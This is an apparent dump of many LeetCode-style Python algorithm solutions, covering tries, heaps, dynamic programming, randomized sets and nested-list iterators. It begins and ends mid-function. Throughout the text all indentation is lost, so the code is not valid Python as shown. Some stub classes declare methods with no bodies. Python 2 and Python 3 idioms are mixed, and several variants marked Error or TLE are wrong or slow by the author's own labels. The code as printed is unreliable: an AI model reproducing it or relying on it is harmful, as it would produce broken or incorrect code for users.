i = bisect_left(F, n)
if i >= 2:
return True
F[i] = n
return False
import sys
class Solution(object):
def increasingTriplet(self, nums):
min1 = sys.maxint
min2 = sys.maxint
for e in nums:
if e < min1:
min1 = e
elif e != min1 and e < min2:
min2 = e
elif e > min2:
return True
return False
def increasingTripletError(self, nums):
stk = []
for elt in nums:
while stk and stk[-1] >= elt:
stk.pop()
stk.append(elt)
if len(stk) >= 3:
return True
return False
from typing import List
from collections import defaultdict
class TrieNode:
def __init__(self):
self.pali_prefix_idxes = []
self.word_idx = None
self.children = defaultdict(TrieNode)
class Solution:
def palindromePairs(self, words: List[str]) -> List[List[int]]:
root = TrieNode()
for idx, w in enumerate(words):
cur = root
for i in range(len(w) - 1, -1, -1):
if self.is_palindrome(w, 0, i + 1):
cur.pali_prefix_idxes.append(idx)
cur = cur.children[w[i]]
cur.pali_prefix_idxes.append(idx)
cur.word_idx = idx
ret = []
for idx, w in enumerate(words):
cur = root
for i in range(len(w)):
if self.is_palindrome(w, i, len(w)) and cur.word_idx is not None and cur.word_idx != idx:
ret.append([idx, cur.word_idx])
cur = cur.children.get(w[i], None)
if cur is None:
break
else:
for idx_j in cur.pali_prefix_idxes:
if idx != idx_j:
ret.append([idx, idx_j])
return ret
def is_palindrome(self, w, lo, hi):
i = lo
j = hi - 1
while i < j:
if w[i] != w[j]:
return False
i += 1
j -= 1
return True
if __name__ == "__main__":
assert Solution().palindromePairs(["a", ""]) == [[0,1],[1,0]]
assert Solution().palindromePairs(["abcd","dcba","lls","s","sssll"]) == [[0,1],[1,0],[2,4],[3,2]]
class TreeNode(object):
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution(object):
def __init__(self):
self.cache_rob = {}
self.cache_notrob = {}
def rob(self, root):
if root is None:
return 0
if root not in self.cache_rob:
val = max(
self.notrob(root),
root.val + self.notrob(root.left) + self.notrob(root.right)
)
self.cache_rob[root] = val
return self.cache_rob[root]
def notrob(self, root):
if root is None:
return 0
if root not in self.cache_notrob:
val = (
self.rob(root.left) +
self.rob(root.right)
)
self.cache_notrob[root] = val
return self.cache_notrob[root]
class SolutionTLE(object):
def rob(self, root):
if root is None:
return 0
return max(
self.dorob(root),
self.notrob(root)
)
def dorob(self, root):
if root is None:
return 0
return (
root.val +
self.notrob(root.left) +
self.notrob(root.right)
)
def notrob(self, root):
if root is None:
return 0
return (max(self.notrob(root.left), self.rob(root.left)) +
max(self.notrob(root.right), self.rob(root.right)))
class Solution(object):
def countBits(self, num):
ret = [0]
i = 0
hi = len(ret)
while len(ret) < num + 1:
if i == hi:
i = 0
hi = len(ret)
ret.append(1+ret[i])
i += 1
return ret
class NestedInteger(object):
def isInteger(self):
def getInteger(self):
def getList(self):
class Solution(object):
def __init__(self):
self.sum = 0
def depthSum(self, nestedList):
for elt in nestedList:
self.dfs(elt, 1)
return self.sum
def dfs(self, ni, depth):
if ni.isInteger():
self.sum += ni.getInteger() * depth
else:
lst = ni.getList()
for elt in lst:
self.dfs(elt, depth + 1)
from collections import defaultdict
class Solution(object):
def lengthOfLongestSubstringKDistinct(self, s, k):
st = 0
counter = defaultdict(int)
maxa = 0
for idx, val in enumerate(s):
if counter[val] == 0:
k -= 1
counter[val] += 1
while k < 0:
counter[s[st]] -= 1
if counter[s[st]] == 0:
k += 1
st += 1
maxa = max(maxa, idx - st + 1)
return maxa
if __name__ == "__main__":
assert Solution().lengthOfLongestSubstringKDistinct("eceba", 2) == 3
class NestedInteger(object):
def isInteger(self):
return True
def getInteger(self):
return 0
def getList(self):
return []
class NestedIterator(object):
def __init__(self, nestedList):
self.stk = [[nestedList, 0]]
def next(self):
nl, idx = self.stk[-1]
nxt = nl[idx].getInteger()
self.stk[-1][1] = idx + 1
return nxt
def hasNext(self):
while self.stk:
nl, idx = self.stk[-1]
if idx < len(nl):
ni = nl[idx]
if ni.isInteger():
return True
else:
self.stk[-1][1] = idx + 1
nxt_nl = ni.getList()
self.stk.append([nxt_nl, 0])
else:
self.stk.pop()
return False
class NestedIteratorVerbose(object):
def __init__(self, nestedList):
self.nl_stk = [nestedList]
self.idx_stk = [0]
def next(self):
if self.hasNext():
nl = self.nl_stk[-1]
idx = self.idx_stk[-1]
nxt = nl[idx]
self.idx_stk[-1] = idx + 1
return nxt
raise StopIteration()
def hasNext(self):
while self.nl_stk:
nl = self.nl_stk[-1]
idx = self.idx_stk[-1]
if idx < len(nl):
ni = nl[idx]
if ni.isInteger():
return True
else:
self.idx_stk[-1] = idx+1
nxt_nl = ni.getList()
nxt_idx = 0
self.nl_stk.append(nxt_nl)
self.idx_stk.append(nxt_idx)
else:
self.nl_stk.pop()
self.idx_stk.pop()
return False
class Solution(object):
def isPowerOfFour(self, num):
if num < 1:
return False
if num & num -1 != 0:
return False
return num % 3 == 1
def isPowerOfFourNaive(self, num):
if num < 1:
return False
if num & num-1 != 0:
return False
while True:
if num == 0:
return False
elif num == 1:
return True
num >>= 2
class Solution(object):
def integerBreak(self, n):
F = [None for _ in xrange(n+1)]
F[1] = 1
for i in xrange(2, n+1):
F[i] = max(
max(F[j] * F[i-j], j * F[i-j], F[j] * (i-j), j * (i-j))
for j in xrange(1, i/2)
)
return F[n]
class Solution(object):
def reverseString(self, s):
return s[::-1]
class Solution(object):
def reverseVowels(self, s):
vowels = set(['a', 'e', 'i', 'o', 'u', 'A', 'E', 'I', 'O', 'U'])
s = list(s)
j = len(s) - 1
i = 0
while i < j:
if s[i] in vowels:
while s[j] not in vowels: j -= 1
s[i], s[j] = s[j], s[i]
j -= 1
i += 1
return "".join(s)
from collections import deque
class MovingAverage(object):
def __init__(self, size):
self.size = size
self.q = deque()
self.sum = 0
def next(self, val):
self.q.append(val)
self.sum += val
if len(self.q) > self.size:
self.sum -= self.q.popleft()
return float(self.sum) / len(self.q)
from collections import defaultdict
import heapq
class Counter(object):
def __init__(self, val, cnt):
self.val = val
self.cnt = cnt
def __cmp__(self, other):
return self.cnt - other.cnt
class Solution(object):
def topKFrequent(self, nums, K):
cnt = defaultdict(int)
for e in nums:
cnt[e] += 1
lst = []
for k, v in cnt.items():
lst.append(Counter(k, v))
ret = []
for elt in lst:
if len(ret) < K:
heapq.heappush(ret, elt)
else:
heapq.heappushpop(ret, elt)
return map(lambda x: x.val, ret)
class TicTacToe(object):
def __init__(self, n):
self.n = n
self.rows_count = [0 for _ in xrange(n)]
self.cols_count = [0 for _ in xrange(n)]
self.diag_count = 0
self.diag_inv_count = 0
def move(self, row, col, player):
delta = -1 if player == 1 else 1
self.cols_count[col] += delta
self.rows_count[row] += delta
if col == row:
self.diag_count += delta
if col + row == self.n - 1:
self.diag_inv_count += delta
is_win = lambda count: delta * count == self.n
if any(map(is_win, [self.rows_count[row], self.cols_count[col], self.diag_count, self.diag_inv_count])):
return player
return 0
class Solution(object):
def intersection(self, nums1, nums2):
return list(set(nums1).intersection(set(nums2)))
from collections import defaultdict
class Solution(object):
def intersect(self, nums1, nums2):
h1, h2 = defaultdict(int), defaultdict(int)
for a in nums1:
h1[a] += 1
for b in nums2:
h2[b] += 1
ret = []
for k, v in h1.items():
cnt = min(v, h2[k])
ret.extend([k]*cnt)
return ret
class Solution(object):
def __init__(self):
self.skip = [[None for _ in xrange(10)] for _ in xrange(10)]
self.skip[1][3], self.skip[3][1] = 2, 2
self.skip[1][7], self.skip[7][1] = 4, 4
self.skip[3][9], self.skip[9][3] = 6, 6
self.skip[7][9], self.skip[9][7] = 8, 8
self.skip[4][6], self.skip[6][4] = 5, 5
self.skip[2][8], self.skip[8][2] = 5, 5
self.skip[1][9], self.skip[9][1] = 5, 5
self.skip[3][7], self.skip[7][3] = 5, 5
def numberOfPatterns(self, m, n):
visited = [False for _ in xrange(10)]
return sum(
self.dfs(1, visited, remain) * 4 +
self.dfs(2, visited, remain) * 4 +
self.dfs(5, visited, remain)
for remain in xrange(m, n+1)
)
def dfs(self, cur, visited, remain):
if remain == 1:
return 1
visited[cur] = True
ret = 0
for nxt in xrange(1, 10):
if (
not visited[nxt] and (
self.skip[cur][nxt] is None or
visited[self.skip[cur][nxt]]
)
):
ret += self.dfs(nxt, visited, remain - 1)
visited[cur] = False
return ret
if __name__ == "__main__":
assert Solution().numberOfPatterns(1, 2) == 65
assert Solution().numberOfPatterns(1, 3) == 385
class Interval(object):
def __init__(self, s=0, e=0):
self.start = s
self.end = e
class SummaryRanges(object):
def __init__(self):
self.itvls = []
def addNum(self, val):
self.itvls.append(Interval(val, val))
def getIntervals(self):
self.itvls.sort(key=lambda x: x.start)
ret = [self.itvls[0]]
for itvl in self.itvls[1:]:
pre = ret[-1]
if itvl.start <= pre.end + 1:
pre.end = max(itvl.end, pre.end)
else:
ret.append(itvl)
self.itvls = ret
return ret
from collections import deque
class SnakeGame(object):
def __init__(self, width, height, food):
self.w = width
self.h = height
self.food = deque(food)
self.body = deque([(0, 0)])
self.dirs = {
'U': (-1, 0),
'L': (0, -1),
'R': (0, 1),
'D': (1, 0),
}
self.eat = 0
def move(self, direction):
x, y = self.body[0]
dx, dy = self.dirs[direction]
x += dx
y += dy
fx, fy = self.food[0] if self.food else (-1, -1)
if x == fx and y == fy:
self.food.popleft()
self.eat += 1
else:
self.body.pop()
if (x, y) in self.body or not (0 <= x < self.h and 0 <= y < self.w):
return -1
self.body.appendleft((x, y))
return self.eat
if __name__ == "__main__":
game = SnakeGame(3, 2, [[1, 2], [0, 1]])
for char, expect in zip('RDRULU', [0, 0, 1, 1, 2, -1]):
assert game.move(char) == expect
import bisect
class Solution(object):
def maxEnvelopes(self, A):
if not A: return 0
A.sort(key=lambda (w, h): (w, -h))
F = [-1 for _ in xrange(len(A)+1)]
F[1] = A[0][1]
k = 1
for _, h in A[1:]:
idx = bisect.bisect_left(F, h, 1, k+1)
F[idx] = h
k += 1 if idx == k+1 else 0
return k
def maxEnvelopesTLE(self, A):
if not A: return 0
predicate = lambda a, b: b[0] > a[0] and b[1] > a[1]
A.sort()
n = len(A)
F = [1 for _ in xrange(n)]
for i in xrange(1, n):
for j in xrange(i):
if predicate(A[j], A[i]):
F[i] = max(F[i], 1 + F[j])
return max(F)
if __name__ == "__main__":
assert Solution().maxEnvelopes([[5, 4], [6, 4], [6, 7], [2, 3]]) == 3
assert Solution().maxEnvelopes([[2,100],[3,200],[4,300],[5,500],[5,400],[5,250],[6,370],[6,360],[7,380]]) == 5
from collections import defaultdict
import heapq
SZ = 10
class Tweet(object):
central_clk = 0
def __init__(self, id, nxt=None):
self.timestamp = Tweet.central_clk
self.id = id
self.next = nxt
Tweet.central_clk += 1
def __cmp__(self, other):
return - (self.timestamp - other.timestamp)
class Twitter(object):
def __init__(self):
self.tweets = defaultdict(lambda: None)
self.followees = defaultdict(set)
def postTweet(self, userId, tweetId):
nxt = self.tweets[userId]
self.tweets[userId] = Tweet(tweetId, nxt)
def getNewsFeed(self, userId):
h = []
if userId not in self.followees[userId] and self.tweets[userId]:
heapq.heappush(h, self.tweets[userId])
for followee in self.followees[userId]:
if self.tweets[followee]:
heapq.heappush(h, self.tweets[followee])
ret = []
while h and len(ret) < SZ:
tweet = heapq.heappop(h)
ret.append(tweet.id)
if tweet.next:
heapq.heappush(h, tweet.next)
return ret
def follow(self, followerId, followeeId):
self.followees[followerId].add(followeeId)
def unfollow(self, followerId, followeeId):
self.followees[followerId].discard(followeeId)
if __name__ == "__main__":
twitter = Twitter()
twitter.postTweet(1, 5)
twitter.unfollow(1, 1)
from collections import defaultdict
class Solution(object):
def __init__(self):
self.x = None
def isReflected(self, points):
d = defaultdict(list)
for x, y in points:
d[y].append(x)
for v in d.values():
if not self.check(v):
return False
return True
def check(self, lst):
lst.sort()
i = 0
j = len(lst) - 1
while i < j:
x = (lst[i] + lst[j]) / float(2)
if not self.x:
self.x = x
elif self.x != x:
return False
i += 1
j -= 1
if i == j:
if not self.x:
self.x = lst[i]
elif self.x != lst[i]:
return False
return True
if __name__ == "__main__":
assert Solution().isReflected([[1,1],[-1,-1]]) == False
class Solution(object):
def countNumbersWithUniqueDigits(self, n):
ret = 1
Fi = 1
for i in xrange(n):
Fi *= (10-i) if i != 0 else 9
ret += Fi
return ret
from collections import defaultdict
import heapq
class Val(object):
def __init__(self, cnt, val):
self.cnt = cnt
self.val = val
def __cmp__(self, other):
if self.cnt == other.cnt:
return cmp(self.val, other.val)
return -cmp(self.cnt, other.cnt)
class Solution(object):
def rearrangeString(self, s, k):
if not s or k == 0: return s
d = defaultdict(int)
for c in s:
d[c] += 1
h = []
for char, cnt in d.items():
heapq.heappush(h, Val(cnt, char))
ret = []
while h:
cur = []
for _ in xrange(k):
if not h:
return "".join(ret) if len(ret) == len(s) else ""
e = heapq.heappop(h)
ret.append(e.val)
e.cnt -= 1
if e.cnt > 0:
cur.append(e)
for e in cur:
heapq.heappush(h, e)
return "".join(ret)
if __name__ == "__main__":
assert Solution().rearrangeString("aabbccdd", 4) == "abcdabcd"
class Logger(object):
def __init__(self):
self.h = {}
def shouldPrintMessage(self, timestamp, message):
if message not in self.h or timestamp - self.h[message] >= 10:
self.h[message] = timestamp
return True
return False
import bisect
class Solution(object):
def sortTransformedArray(self, nums, a, b, c):
if a == 0:
ret = map(lambda x: self.f(x, a, b, c), nums)
return ret if b > 0 else ret[::-1]
mid = - float(b) / (2*a)
ri = bisect.bisect_left(nums, mid)
le = ri - 1
ret = []
while le >= 0 and ri < len(nums) and le < ri:
f_le = self.f(nums[le], a, b, c)
f_ri = self.f(nums[ri], a, b, c)
if a > 0 and f_le < f_ri or a < 0 and f_le > f_ri:
ret.append(f_le)
le -= 1
else:
ret.append(f_ri)
ri += 1
while le >= 0:
ret.append(self.f(nums[le], a, b, c))
le -= 1
while ri < len(nums):
ret.append(self.f(nums[ri], a, b, c))
ri += 1
return ret if a > 0 else ret[::-1]
def f(self, x, a, b, c):
return a * (x ** 2) + b * x + c
if __name__ == "__main__":
assert Solution().sortTransformedArray([-4, -2, 2, 4], -1, 3, 5) == [-23, -5, 1, 7]
class Solution(object):
def maxKilledEnemies(self, grid):
if not grid: return 0
m, n = len(grid), len(grid[0])
rows = [0 for _ in xrange(m)]
cols = [0 for _ in xrange(n)]
gmax = 0
for i in xrange(m):
for j in xrange(n):
if i == 0 or grid[i-1][j] == 'W':
cols[j] = 0
for k in xrange(i, m):
if grid[k][j] == 'E':
cols[j] += 1
elif grid[k][j] == 'W':
break
if j == 0 or grid[i][j-1] == 'W':
rows[i] = 0
for k in xrange(j, n):
if grid[i][k] == 'E':
rows[i] += 1
elif grid[i][k] == 'W':
break
if grid[i][j] == '0':
gmax = max(gmax, rows[i] + cols[j])
return gmax
if __name__ == "__main__":
assert Solution().maxKilledEnemies(["0E00", "E0WE", "0E00"]) == 3
from collections import deque
class HitCounter(object):
def __init__(self):
self.q = deque()
def hit(self, timestamp):
self.pop(timestamp)
self.q.append(timestamp)
def getHits(self, timestamp):
self.pop(timestamp)
return len(self.q)
def pop(self, timestamp):
while self.q and timestamp - self.q[0] >= 300:
self.q.popleft()
class NestedInteger(object):
def __init__(self, value=None):
def isInteger(self):
def add(self, elem):
def setInteger(self, value):
def getInteger(self):
def getList(self):
class Solution(object):
def __init__(self):
self.sum = 0
def depthSumInverse(self, nestedList):
inv_depth = self.height(nestedList)
self.inverseDepthSum(nestedList, inv_depth)
return self.sum
def height(self, nl):
nl_lst = filter(lambda x: not x.isInteger(), nl)
if not nl_lst:
return 1
if nl_lst:
return 1 + max(
map(lambda x: self.height(x.getList()), nl_lst)
)
def inverseDepthSum(self, nl, inv_depth):
nl_lst = filter(lambda x: not x.isInteger(), nl)
ni_list = filter(lambda x: x.isInteger(), nl)
if nl_lst:
map(lambda x: self.inverseDepthSum(x.getList(), inv_depth - 1), nl_lst)
if ni_list:
self.sum += sum(map(lambda x: x.getInteger() * inv_depth, ni_list))
class SolutionError(object):
def __init__(self):
self.sum = 0
def depthSumInverse(self, nestedList):
self.dfs(nestedList)
return self.sum
def dfs(self, nl):
height = 1
nl_lst = filter(lambda x: not x.isInteger(), nl)
ni_list = filter(lambda x: x.isInteger(), nl)
if nl_lst:
height = 1 + max(
map(lambda x: self.dfs(x.getList()), nl_lst)
)
if ni_list:
self.sum += sum(map(lambda x: x.getInteger() * height, ni_list))
return height
class Solution(object):
def canMeasureWater(self, x, y, z):
if x + y < z: return False
if x == z or y == z: return True
return z % self.gcd(x, y) == 0
def gcd(self, a, b):
while b:
a, b = b, a%b
return a
class TreeNode(object):
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution(object):
def findLeaves(self, root):
leaves = []
self.dfs(root, leaves)
return leaves
def dfs(self, node, leaves):
if not node:
return -1
height = 1 + max(self.dfs(node.left, leaves), self.dfs(node.right, leaves))
if height >= len(leaves):
leaves.append([])
leaves[height].append(node.val)
return height
class Solution(object):
def isPerfectSquare(self, num):
if num == 1: return True
lo = 1
hi = num/2 + 1
while lo < hi:
mid = (lo + hi) / 2
midsq = mid**2
if midsq == num:
return True
elif midsq < num:
lo = mid + 1
else:
hi = mid
return False
from collections import deque
class Solution(object):
def largestDivisibleSubset(self, A):
if not A: return []
F = {}
pi = {}
A.sort()
for i in xrange(len(A)):
F[i] = 1
pi[i] = i
for j in xrange(i):
if A[i] % A[j] == 0:
if F[i] < 1 + F[j]:
F[i] = 1 + F[j]
pi[i] = j
max_i, max_v = 0, 1
for k, v in F.items():
if v > max_v:
max_i, max_v = k, v
ret = deque()
cur = max_i
ret.appendleft(A[cur])
while pi[cur] != cur:
cur = pi[cur]
ret.appendleft(A[cur])
return list(ret)
if __name__ == "__main__":
assert Solution().largestDivisibleSubset([1, 2, 4, 8]) == [1, 2, 4, 8]
class ListNode(object):
def __init__(self, x):
self.val = x
self.next = None
class Solution(object):
def plusOne(self, head):
head = self.revserse(head)
head = self.plus(head)
head = self.revserse(head)
return head
def plus(self, head):
cur = head
while cur:
cur.val += 1
if cur.val >= 10:
cur.val -= 10
if not cur.next:
cur.next = ListNode(0)
cur = cur.next
else:
break
return head
def revserse(self, head):
if not head:
return None
dummy = ListNode(0)
dummy.next = head
pre = dummy
cur = pre.next
while pre and cur:
nxt = cur.next
cur.next = pre
pre = cur
cur = nxt
dummy.next.next = None
return pre
class Solution(object):
def getModifiedArray(self, length, updates):
deltas = [0 for _ in xrange(length)]
for i, j, k in updates:
deltas[i] += k
if j + 1 < length: deltas[j + 1] -= k
ret = []
acc = 0
for delta in deltas:
acc += delta
ret.append(acc)
return ret
class Solution(object):
def getSum(self, a, b):
MAX = 0x7FFFFFFF
MSK = 0xFFFFFFFF
carry = (a & b) << 1
out = a ^ b
carry &= MSK
out &= MSK
if carry != 0:
return self.getSum(out, carry)
else:
if out < MAX:
return out
else:
return ~(out ^ MSK)
C = 1337
class Solution(object):
def superPow(self, a, b):
if not b:
return 1
s = 1
lsd = b.pop()
s *= (a % C) ** lsd
s %= C
rest = self.superPow(a, b)
s *= rest ** 10
s %= C
return s
if __name__ == "__main__":
print Solution().superPow(2, [1, 0])
import heapq
class Solution(object):
def kSmallestPairs(self, nums1, nums2, k):
class Node(object):
def __init__(self, i, j):
self.i, self.j = i, j
def __cmp__(self, other):
return nums1[self.i] + nums2[self.j] - (nums1[other.i] + nums2[other.j])
def hasnext(self):
return self.j + 1 < len(nums2)
def next(self):
if self.hasnext():
return Node(self.i, self.j + 1)
raise StopIteration
if not nums1 or not nums2:
return []
h = []
for i in xrange(min(k, len(nums1))):
heapq.heappush(h, Node(i, 0))
ret = []
while h and len(ret) < k:
node = heapq.heappop(h)
ret.append([nums1[node.i], nums2[node.j]])
if node.hasnext():
heapq.heappush(h, node.next())
return ret
def kSmallestPairsError(self, nums1, nums2, k):
i = 0
j = 0
ret = []
for _ in xrange(k):
if i < len(nums1) and j < len(nums2):
ret.append([nums1[i], nums2[j]])
if nums1[i] < nums2[j]:
j += 1
else:
i += 1
else:
break
return ret
if __name__ == "__main__":
assert Solution().kSmallestPairs([1, 7, 11], [2, 4, 6], 9) == [[1, 2], [1, 4], [1, 6], [7, 2], [7, 4], [11, 2],
[7, 6], [11, 4], [11, 6]]
def guess(num):
return -1
class Solution(object):
def guessNumber(self, n):
lo, hi = 1, n+1
while True:
mid = (lo + hi) / 2
g = guess(mid)
if g == 0:
return mid
elif g < 1:
hi = mid
else:
lo = mid + 1
class Solution(object):
def getMoneyAmount(self, n):
N = n + 1
F = [[0 for _ in xrange(N+1)] for _ in xrange(N+1)]
for i in xrange(n, 0, -1):
for j in xrange(i+2, N+1):
F[i][j] = min(
k + max(F[i][k], F[k+1][j])
for k in xrange(i, j)
)
return F[1][N]
def getMoneyAmountError(self, n):
C = [0 for _ in xrange(n+1)]
F = [0 for _ in xrange(n+1)]
for i in xrange(2, n+1):
C[i] = min(1 + max(C[k-1], C[i-k]) for k in xrange(1, i+1))
F[i] = min(k + max(F[k-1], k*C[i-k] + F[i-k]) for k in xrange(1, i+1))
return F[n]
if __name__ == "__main__":
print Solution().getMoneyAmount(100)
class Solution(object):
def wiggleMaxLength(self, A):
if not A: return 0
N = len(A)
H = [1 for _ in xrange(N)]
L = [1 for _ in xrange(N)]
for i in xrange(1, N):
L[i] = H[i-1] + 1 if A[i] < A[i-1] else L[i-1]
H[i] = L[i-1] + 1 if A[i] > A[i-1] else H[i-1]
return max(H[N-1], L[N-1])
def wiggleMaxLengthSuboptimal(self, A):
if not A: return 0
N = len(A)
H = [1 for _ in xrange(N)]
L = [1 for _ in xrange(N)]
gmax = 1
for i in xrange(1, N):
for j in xrange(i):
if A[i] > A[j]:
H[i] = max(H[i], L[j] + 1)
elif A[i] < A[j]:
L[i] = max(L[i], H[j] + 1)
gmax = max(gmax, H[i], L[i])
return gmax
class Solution(object):
def combinationSum4(self, nums, target):
F = [0 for _ in xrange(target + 1)]
nums = filter(lambda x: x <= target, nums)
for k in nums:
F[k] = 1
for i in xrange(target + 1):
for k in nums:
if i - k >= 0:
F[i] += F[i-k]
return F[target]
if __name__ == "__main__":
assert Solution().combinationSum4([1, 2, 3], 4) == 7
import heapq
class Solution(object):
def kthSmallest(self, matrix, k):
m, n = len(matrix), len(matrix[0])
class Node(object):
def __init__(self, i, j):
self.i = i
self.j = j
def __cmp__(self, other):
return matrix[self.i][self.j] - matrix[other.i][other.j]
def hasnext(self):
return self.j+1 < n
def next(self):
if self.hasnext():
return Node(self.i, self.j + 1)
raise StopIteration
h = []
for i in xrange(m):
heapq.heappush(h, Node(i, 0))
ret = None
for _ in xrange(k):
ret = heapq.heappop(h)
if ret.hasnext():
heapq.heappush(h, ret.next())
return matrix[ret.i][ret.j]
def kthSmallestError(self, matrix, k):
m, n = len(matrix), len(matrix[0])
i = k % n
j = k - (i * m)
return matrix[i][j]
if __name__ == "__main__":
matrix = [
[1, 5, 9],
[10, 11, 13],
[12, 13, 15]
]
k = 8
print Solution().kthSmallest(matrix, k)
class PhoneDirectory(object):
def __init__(self, maxNumbers):
self.released = set()
self.l = maxNumbers
self.i = 0
def get(self):
if self.released:
return self.released.pop()
if self.i < self.l:
ret = self.i
self.i += 1
return ret
return -1
def check(self, number):
return number in self.released or self.i <= number < self.l
def release(self, number):
if self.i <= number < self.l:
return
self.released.add(number)
import random
class RandomizedSet(object):
def __init__(self):
self.lst = []
self.pos = {}
def insert(self, val):
if val in self.pos:
return False
self.lst.append(val)
self.pos[val] = len(self.lst) - 1
return True
def remove(self, val):
if val not in self.pos:
return False
idx, last = self.pos[val], len(self.lst) - 1
if idx != last:
self.lst[idx], self.lst[last] = self.lst[last], self.lst[idx]
self.pos[self.lst[idx]] = idx
del self.pos[val]
self.lst.pop()
return True
def getRandom(self):
return random.choice(self.lst)
class RandomizedSetTLE(object):
def __init__(self):
self.set = set()
def insert(self, val):
ret = val not in self.set
self.set.add(val)
return ret
def remove(self, val):
ret = val in self.set
self.set.discard(val)
return ret
def getRandom(self):
return random.sample(self.set, 1)[0]
from collections import defaultdict
import random
class RandomizedCollection(object):
def __init__(self):
self.lst = []
self.pos = defaultdict(set)
def insert(self, val):
flag = True if not self.pos[val] else False
self.lst.append(val)
self.pos[val].add(len(self.lst) - 1)
return flag
def remove(self, val):
if not self.pos[val]:
return False
idx, last = self.pos[val].pop(), len(self.lst) - 1
if idx != last:
self.lst[idx], self.lst[last] = self.lst[last], self.lst[idx]
self.pos[self.lst[idx]].remove(last)
self.pos[self.lst[idx]].add(idx)
self.lst.pop()
return True
def getRandom(self):
return random.choice(self.lst)
import random
class ListNode(object):
def __init__(self, x):
self.val = x
self.next = None
class Solution(object):
def __init__(self, head):
self.head = head
def getRandom(self):
ret = self.head
cur = self.head.next
idx = 1
while cur:
if random.randrange(0, idx+1) == 0:
ret = cur
cur = cur.next
idx += 1
return ret.val
from collections import defaultdict
class Solution(object):
def canConstruct(self, ransomNote, magazine):
d = defaultdict(int)
for e in magazine:
d[e] += 1
for e in ransomNote:
if d[e] == 0:
return False
d[e] -= 1
return True
import random
class Solution(object):
def __init__(self, nums):
self.original = nums
def reset(self):
return list(self.original)
def shuffle(self):
lst = self.reset()
n = len(lst)
for i in xrange(n):
j = random.randrange(i, n)
lst[i], lst[j] = lst[j], lst[i]
return lst
class NestedInteger(object):
def __init__(self, value=None):
def isInteger(self):
def add(self, elem):
def setInteger(self, value):
def getInteger(self):
def getList(self):
class Solution(object):
def deserialize(self, s):
if not s: return None
stk = []
i = 0
while i < len(s):
if s[i] == '[':
stk.append(NestedInteger())
i += 1
elif s[i] == ']':
ni = stk.pop()
if not stk: return ni
stk[-1].add(ni)
i += 1
elif s[i] == ',':
i += 1
else:
j = i
while j < len(s) and (s[j].isdigit() or s[j] == '-'): j += 1
ni = NestedInteger(int(s[i: j]) if s[i: j] else None)
if not stk: return ni
stk[-1].add(ni)
i = j
return stk.pop()
if __name__ == "__main__":
Solution().deserialize("[123,[456,[789]]]")
class Solution(object):
def lexicalOrder(self, n):
def gen():
i = 1
for _ in xrange(n):
yield i
if i * 10 <= n:
i *= 10
elif i % 10 != 9 and i + 1 <= n:
i += 1
else:
while i % 10 == 9 or i + 1 > n:
i /= 10
i += 1
return list(gen())
def lexicalOrderError(self, n):
ret = []
for i in xrange(1, 10):
sig = 1
while i * sig <= n:
ret.extend(range(
i * sig,
min((1+i)*sig-1, n)+1),
)
sig *= 10
return ret
if __name__ == "__main__":
assert Solution().lexicalOrder(30) == [1, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 2, 20, 21, 22, 23, 24, 25, 26, 27,
28, 29, 3, 30, 4, 5, 6, 7, 8, 9]
class Solution(object):
def firstUniqChar(self, s):
if not s:
return -1
first = {}
for i, v in enumerate(list(s)):
if v not in first:
first[v] = i
else:
first[v] = -1
lst = filter(lambda x: x != -1, first.values())
return min(lst) if lst else -1
if __name__ == "__main__":
assert Solution().firstUniqChar("leetcode") == 0
class Solution(object):
def lengthLongestPath(self, input):
input = input.split('\n')
F = []
gmax = 0
for elt in input:
idx = elt.count('\t')
idx = min(idx, len(F))
e = elt.strip('\t')
prev = -1 if idx == 0 else F[idx-1]
if idx == len(F):
F.append(prev + 1 + len(e))
else:
F[idx] = prev + 1 + len(e)
if '.' in elt:
gmax = max(gmax, F[idx])
return gmax
if __name__ == "__main__":
assert Solution().lengthLongestPath("dir\n    file.txt") == 12
from collections import defaultdict
class Solution(object):
def findTheDifference(self, s, t):
d = defaultdict(int)
for e in s:
d[e] += 1
for e in t:
if d[e] == 0:
return e
d[e] -= 1
return
class Solution(object):
def lastRemaining(self, n):
remain = n
head = 1
step = 1
from_left = True
while remain > 1:
if from_left:
head += step
elif remain % 2 == 1:
head += step
step *= 2
remain /= 2
from_left = not from_left
return head
from bisect import bisect_left
from collections import defaultdict
class Solution:
def isSubsequence(self, s: str, t: str) -> bool:
char_pos = defaultdict(list)
for p, c in enumerate(t):
char_pos[c].append(p)
lo_po = -1
for c in s:
if c not in char_pos:
return False
pos = char_pos[c]
i = bisect_left(pos, lo_po)
if i == len(pos):
return False
lo_po = pos[i] + 1
return True
if __name__ == "__main__":
assert Solution().isSubsequence("abc", "ahbgdc") == True
assert Solution().isSubsequence("acb", "ahbgdc") == False
class Solution(object):
def isSubsequence(self, s, t):
i = 0
j = 0
while i < len(s) and j < len(t):
if t[j] != s[i]:
j += 1
else:
i += 1
j += 1
return i == len(s)
class Solution(object):
def validUtf8(self, data):
required = 0
for d in data:
if d & 0x80 == 0:
if required != 0:
return False
else:
one_cnt = 0
while d & 0x80 == 0x80:
one_cnt += 1
d <<= 1
if required != 0:
if one_cnt != 1:
return False
required -= 1
else:
if one_cnt == 1:
return False
required += (one_cnt - 1)
return required == 0
if __name__ == "__main__":
assert Solution().validUtf8([197, 130, 1]) == True
assert Solution().validUtf8([235, 140, 4]) == False
class Solution(object):
def decodeString(self, s):
stk = [
[1, []]
]
i = 0
while i < len(s):
if s[i].isdigit():
j = i+1
while s[j] != '[': j += 1
stk.append([
int(s[i:j]), []
])
i = j+1
elif s[i].islower():
stk[-1][1].append(s[i])
i += 1
elif s[i] == ']':
cnt, partial = stk.pop()
partial = ''.join(partial) * cnt
stk[-1][1].append(partial)
i += 1
return ''.join(stk.pop()[1])
class SolutionVerbose(object):
def decodeString(self, s):
stk = []
i = 0
ret = []
while i < len(s):
if s[i].isdigit():
j = i+1
while s[j] != '[': j += 1
stk.append([
int(s[i:j]), []
])
i = j+1
elif s[i].islower():
if not stk:
ret.append(s[i])
else:
stk[-1][1].append(s[i])
i += 1
elif s[i] == ']':
cnt, partial = stk.pop()
partial = ''.join(partial) * cnt
if not stk:
ret.append(partial)
else:
stk[-1][1].append(partial)
i += 1
return ''.join(ret)
class SolutionError(object):
def decodeString(self, s):
stk = []
i = 0
ret = []
while i < len(s):
if s[i].isdigit():
j = i + 1
while s[j] != '[': j += 1
prev = stk[-1] if stk else 1
stk.append(prev * int(s[i:j]))
